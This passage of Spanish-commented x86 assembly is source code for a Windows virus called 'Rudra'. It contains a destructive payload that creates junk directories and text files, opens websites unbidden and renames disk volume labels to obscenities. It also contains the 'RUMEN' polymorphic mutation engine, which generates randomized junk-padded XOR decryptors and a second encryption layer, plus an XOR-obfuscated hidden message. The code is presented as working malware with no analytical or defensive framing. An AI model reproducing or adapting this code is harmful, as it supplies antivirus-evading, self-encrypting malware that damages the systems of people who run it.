                        DB      "file://C:\con\con", 00h

  Volumenz              DB      "Mierda", 00h
                        DB      "Sodomia", 00h
                        DB      "Mis Nalgas", 00h
                        DB      "Gay Tu Papa", 00h
                        DB      "Putas", 00h
                        DB      "Rudra", 00h

  @Puyalo:
    MOV EAX, DWO [Puyado]
    ADD DWO [Puyado], EAX
    XOR EDX, EDX
    DIV EBX
    XCHG EDX, EAX
    RET

  @CrearDirectorios:

    PUSH 10d
    POP EBX
    CALL @Puyalo
    XCHG ECX, EAX
    LEA EDI, OFS [Directorios]
    PUSH ECX
    XOR AL, AL
    @CD1:
    SCASB
    JNZ @CD1
    LOOP @CD1

    PUSH NULL
    PUSH EDI
    APICALL CreateDirectoryA

    PUSH EDI
    APICALL SetCurrentDirectoryA

    PUSH NULL
    CALL @CD2
    DB "Leeme Por Favor.txt", 00h, 90h
    @CD2: APICALL _lcreat
    MOV DWO [FHandle], EAX

    POP ECX

    LEA EDI, OFS [Idioteces]
    XOR AL, AL   
    @CD3:
    SCASB
    JNZ @CD3
    LOOP @CD3
      
    PUSH EDI
    XOR ECX, ECX
    @CD4:
    INC ECX
    SCASB
    JNZ @CD4
    POP EDI

    PUSH ECX
    PUSH EDI
    PUSH DWO [FHandle]
    APICALL _lwrite

    PUSH DWO [FHandle]
    APICALL CloseHandle

    JMP @Retorna_Paylo

  @PonerSitios:

    CALL @PS1
    DB "SHELL32.DLL", 00h, 90h, 90h
    @PS1: APICALL LoadLibraryA
    OR EAX, EAX
    JZ @Retorna_Paylo

    CALL @PS2
    DB "ShellExecuteA", 00h, 90h, 90h, 90h, 90h
    @PS2: PUSH EAX
    APICALL GetProcAddress
    OR EAX, EAX
    JZ @Retorna_Paylo

    PUSH EAX

    PUSH 05d
    POP EBX
    CALL @Puyalo

    LEA EDI, OFS [Sitios_Web]

    XCHG ECX, EAX
    XOR AL, AL
    @PS3:
    SCASB
    JNZ @PS3
    LOOP @PS3

    POP EAX
    
    XOR EBX, EBX
    PUSH SW_SHOW
    PUSH EBX
    PUSH EBX
    PUSH EDI
    PUSH EBX
    PUSH EBX
    CALL EAX

    JMP @Retorna_Paylo

  @CambiarVolumen:

    PUSH 06d
    POP EBX
    CALL @Puyalo

    XCHG ECX, EAX
    XOR AL, AL
    LEA EDI, OFS [Volumenz]

    @CV1:
    SCASB
    JNZ @CV1

    PUSH EDI
    PUSH NULL
    APICALL SetVolumeLabelA

    JMP @Retorna_Paylo

  Puyado                DD      00000000h
  
  Paylo                 ENDP

; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

  ; RUMEN: Rudra Mutation Engine.
  ;
  ; EDI -> Donde guardar el virus encriptado.
  ; ESI -> Codigo a encriptar.
  ; ECX -> Tamaคo del codigo a encriptar.

  RUMEN                 PROC

  MOV DWO [Guarda_DC], EDI
  MOV DWO [Tamaคo_EC], ECX

  LEA EAX, OFS [Fecha]
  PUSH EAX
  APICALL GetSystemTime

  MOV AX, WO [Ultimo_Dia]
  CMP WO [Fecha.wDay], AX
  JE @Semillas_Listas

  MOV AX, WO [Fecha.wDay]
  MOV WO [Ultimo_Dia], AX
  
  APICALL GetTickCount
  MOV DWO [Aleat], EAX                          ; inicializar la semilla

  RDTSC
  XCHG EBX, EAX
  CALL Random
  MOV DWO [Llave], EAX

  RDTSC
  XCHG EBX, EDX
  CALL Random
  MOV WO [Llave_II], AX

  @Semillas_Listas:

  CALL @Segunda_Capa
  
  CALL @Colocar_Opcodes

  LEA ESI, OFS [@I0]
  MOVSD
  MOVSB

  CALL @Colocar_Opcodes

  LEA ESI, OFS [@I1]
  MOVSB

  CALL @Colocar_Opcodes

  LEA ESI, OFS [@I2]
  MOVSW
  MOVSD

  CALL @Colocar_Opcodes

  LEA ESI, OFS [@I3]
  MOVSD
  MOVSW

  CALL @Colocar_Opcodes

  LEA ESI, OFS [@I4]
  MOVSD
  MOVSB

  CALL @Colocar_Opcodes

  LEA ESI, OFS [@I5]
  MOVSW

  MOV EAX, DWO [Llave]
  STOSD

  CALL @Colocar_Opcodes

  LEA ESI, OFS [@I6]
  MOVSW
  MOVSB

  CALL @Colocar_Opcodes

  LEA ESI, OFS [@I7]
  MOVSW

  ; ya esta hecho el desencriptor... ahora...

  MOV ESI, DWO [Memoria]
  MOV EAX, DWO [Tamaคo_EC]
  MOV EBX, 00000004h
  XOR EDX, EDX
  DIV EBX
  XCHG EAX, ECX
  MOV EAX, DWO [Llave]

  @EC:
    MOVSD
    XOR DWORD PTR [EDI-4h], EAX
  LOOP @EC

  PUSH EDI

  PUSH MEM_DECOMMIT
  PUSH Tamaคo_Virus
  PUSH DWO [Memoria]
  APICALL VirtualFree

  POP EDI

  RET

  Guarda_DC             DD      00000000h
  Tamaคo_EC             DD      00000000h
  Llave                 DD      00000000h
  Memoria               DD      00000000h
  Ultimo_Dia            DW      0000h

  ; Instrucciones esenciales

  DB 24d DUP (90h)
  @I0: DB 0E8h, 00h, 00h, 00h, 00h        ; CALL Delta
  DB 24d DUP (90h)
  @I1: POP EBP
  DB 24d DUP (90h)
  @I2: SUB EBP, OFFSET DELTA
  DB 24d DUP (90h)
  @I3: LEA EDI, OFS [Empieza_Virus]
  DB 24d DUP (90h)
  @I4: MOV ECX, Tamaคo_Virus / 4
  DB 24d DUP (90h)
  @I5: DB 081h, 037h
  DB 24d DUP (90h)
  @I6: ADD EDI, 04h
  DB 24d DUP (90h)
  @I7: LOOP (@I5)-4d

  ; De Seis bytes.

  @6Bytes:

  DB 081h, 0C3h                           ; ADD EBX
  DB 081h, 0C2h                           ; ADD EDX
  DB 081h, 0C6h                           ; ADD ESI
  DB 081h, 0EBh                           ; SUB EBX
  DB 081h, 0EAh                           ; SUB EDX
  DB 081h, 0EEh                           ; SUB ESI
  DB 081h, 0F3h                           ; XOR EBX
  DB 081h, 0F2h                           ; XOR EDX
  DB 081h, 0F6h                           ; XOR ESI
  DB 069h, 0C0h                           ; IMUL EAX
  DB 069h, 0DBh                           ; IMUL EBX
  DB 069h, 0D2h                           ; IMUL EDX
  DB 069h, 0F6h                           ; IMUL ESI
  DB 081h, 0E3h                           ; AND EBX
  DB 081h, 0E2h                           ; AND EDX
  DB 081h, 0E6h                           ; AND ESI
  DB 081h, 0CBh                           ; OR EBX
  DB 081h, 0CAh                           ; OR EDX
  DB 081h, 0CEh                           ; OR ESI

  ; Colocar un opcode de seis bytes...

  @Meter_Opcode_6B:

  PUSH 018d
  POP EBX
  CALL Random
  IMUL EAX, 02h
  LEA ESI, OFS [@6Bytes]
  ADD ESI, EAX
  MOVSW
  XOR EBX, EBX
  DEC EBX
  CALL Random
  MOVSD

  RET

  ; Instrucciones de cinco bytes.

  @5Bytes:

  DB 0B8h                                 ; MOV EAX
  DB 0BBh                                 ; MOV EBX
  DB 0BAh                                 ; MOV EDX
  DB 0BEh                                 ; MOV ESI
  DB 005h                                 ; ADD EAX
  DB 02Dh                                 ; SUB EAX
  DB 035h                                 ; XOR EAX
  DB 025h                                 ; AND EAX
  DB 0D7h                                 ; OR EAX

  ; Colocar un opcode de cinco bytes.

  @Meter_Opcode_5B:

  PUSH 08d
  POP EBX
  CALL Random
  LEA ESI, OFS [@5Bytes]
  ADD ESI, EAX
  MOVSB
  XOR EBX, EBX
  DEC EBX
  CALL Random
  MOVSD

  RET

  ; Intrucciones de dos bytes.

  @2Bytes:

  DB 001h, 0C0h                           ; ADD EAX, EAX
  DB 031h, 0C0h                           ; XOR EAX, EAX
  DB 001h, 0DBh                           ; ADD EBX, EBX
  DB 031h, 0DBh                           ; XOR EBX, EBX
  DB 001h, 0D2h                           ; ADD EDX, EDX
  DB 031h, 0D2h                           ; XOR EDX, EDX
  DB 001h, 0D8h                           ; ADD EAX, EBX
  DB 001h, 0D0h                           ; ADD EAX, EDX
  DB 031h, 0D8h                           ; XOR EAX, EBX
  DB 031h, 0D0h                           ; XOR EAX, EDX
  DB 031h, 0C3h                           ; XOR EBX, EAX
  DB 031h, 0D3h                           ; XOR EBX, EDX
  DB 031h, 0C2h                           ; XOR EDX, EAX
  DB 031h, 0DAh                           ; XOR EDX, EBX
  DB 001h, 0F6h                           ; ADD ESI, ESI
  DB 031h, 0F6h                           ; XOR ESI, ESI

  @Meter_Opcode_2B:

  PUSH 15d
  POP EBX
  CALL Random
  ADD EAX, EAX
  LEA ESI, OFS [@2Bytes]
  ADD ESI, EAX
  MOVSB
  MOVSB
  RET


  ; Instrucciones de un byte.

  @1Byte:

  DB 046h                                  ; INC ESI
  DB 04Eh                                  ; DEC ESI
  DB 040h                                  ; INC EDX
  DB 042h                                  ; INC EAX
  DB 043h                                  ; INC EBX
  DB 04Ah                                  ; DEC EDX
  DB 048h                                  ; DEC EAX
  DB 04Bh                                  ; DEC EBX
  DB 092h                                  ; XCHG EDX, EAX
  DB 093h                                  ; XCHG EBX, EAX
  DB 096h                                  ; XCHG ESI, EAX


  ; Colocar opcode de un byte.

  @Meter_Opcode_1B:

  PUSH 10d
  POP EBX
  CALL Random
  LEA ESI, OFS [@1Byte]
  ADD ESI, EAX
  MOVSB

  RET

  ; Este proceso rellena cada bloque de 24 bytes con varias combinaciones
  ; diferentes de opcodes.

  @Colocar_Opcodes:

  PUSH 04d
  POP ECX

  @CO_1:

  ; Manera1: 20%     0-20
  ; Manera2: 20%    20-40
  ; Manera3: 20%    40-60
  ; Manera4: 10%    60-70
  ; Manera5: 15%    70-85
  ; Manera6: 15%    85-100

  PUSH 20d
  POP EBX
  CALL Random

  CMP AL, 4d
  JBE @CO_Manera1

  CMP AL, 8d
  JBE @CO_Manera2

  CMP AL, 12d
  JBE @CO_Manera3

  CMP AL, 14d
  JBE @CO_Manera4

  CMP AL, 17d
  JBE @CO_Manera5

  CMP AL, 20d
  JBE @CO_Manera6

  JMP @CO_1

  @CO_Regresa:

  LOOP @CO_1

  RET

  @CO_Manera1:
    CALL @Meter_Opcode_6B
    JMP @CO_Regresa

  @CO_Manera2:
    CALL @Meter_Opcode_1B
    CALL @Meter_Opcode_5B
    JMP @CO_Regresa

  @CO_Manera3:
    CALL @Meter_Opcode_5B
    CALL @Meter_Opcode_1B
    JMP @CO_Regresa

  @CO_Manera4:
    CALL @Meter_Opcode_2B
    CALL @Meter_Opcode_2B
    CALL @Meter_Opcode_2B
    JMP @CO_Regresa

  @CO_Manera5:
    CALL @Meter_Opcode_2B
    CALL @Meter_Opcode_1B
    CALL @Meter_Opcode_2B
    CALL @Meter_Opcode_1B
    JMP @CO_Regresa

  @CO_Manera6:
    CALL @Meter_Opcode_1B
    CALL @Meter_Opcode_2B
    CALL @Meter_Opcode_2B
    CALL @Meter_Opcode_1B
    JMP @CO_Regresa

  ; Generador de numeros aleatorios de congruencia linear.
  ;
  ; EBX -> Limite superior.
  ; Retorna en EAX el numero aleatorio.

  Random:

  PUSH ECX

  MOV EAX, DWO [Aleat]
  IMUL EAX, EAX, 036FB5419h
  ADD EAX, 00004A6Dh
  MOV DWO [Aleat], EAX

  XOR EDX, EDX
  DIV EBX
  XCHG EDX, EAX

  POP ECX
  RET

  ; Proceso para copiar la segunda capa de encriptacion.

  @Segunda_Capa:

  PUSHAD

  PUSH PAGE_READWRITE
  PUSH MEM_COMMIT + MEM_RESERVE + MEM_TOP_DOWN
  PUSH Tamaคo_Virus
  PUSH NULL
  APICALL VirtualAlloc
  MOV DWO [Memoria], EAX
  OR EAX, EAX
  JZ @NosJodimos

  MOV EDI, EAX

  LEA ESI, OFS [Empieza_Virus]
  MOV ECX, (Empieza_Layer2 - Empieza_Virus)
  REP MOVSB

  MOV AX, WO [Llave_II]
  MOV ECX, Tamaคo_Layer2 / 2
  @@JO:
    MOVSW
    ADD WORD PTR [EDI-2h], AX
  LOOP @@JO

  @NosJodimos:

  POPAD

  RET

  Aleat                 DD      00000000h

  RUMEN                 ENDP
; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

  NOP

  DB                    "R" XOR 43h
  DB                    "e" XOR 43h
  DB                    "c" XOR 43h
  DB                    "u" XOR 43h
  DB                    "e" XOR 43h
  DB                    "r" XOR 43h
  DB                    "d" XOR 43h
  DB                    "a" XOR 43h
  DB                    " " XOR 43h
  DB                    "e" XOR 43h
  DB                    "l" XOR 43h
  DB                    " " XOR 43h
  DB                    "4" XOR 43h
  DB                    " " XOR 43h
  DB                    "d" XOR 43h
  DB                    "e" XOR 43h
  DB                    " " XOR 43h
  DB                    "F" XOR 43h
  DB                    "e" XOR 43h
  DB                    "b" XOR 43h
  DB                    "r" XOR 43h
  DB                    "e" XOR 43h
  DB                    "r" XOR 43h
  DB                    "o" XOR 43h
  DB                    " " XOR 43h
  DB                    "d" XOR 43h
  DB                    "e" XOR 43h
  DB                    " " XOR 43h
  DB                    "1" XOR 43h
  DB                    "9" XOR 43h
  DB                    "9" XOR 43h
  DB                    "2" XOR 43h
  DB                    "." XOR 43h
  DB                    "." XOR 43h
  DB                    "." XOR 43h
  DB                            43h


  Termina_Virus         LABEL   NEAR

; อออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ

  Host_Falso            PROC

    CALL MessageBoxA, 0, OFFSET Ventana, OFFSET Titulo, 0
    CALL ExitProcess, 0

  Host_Falso            ENDP


End Rudra
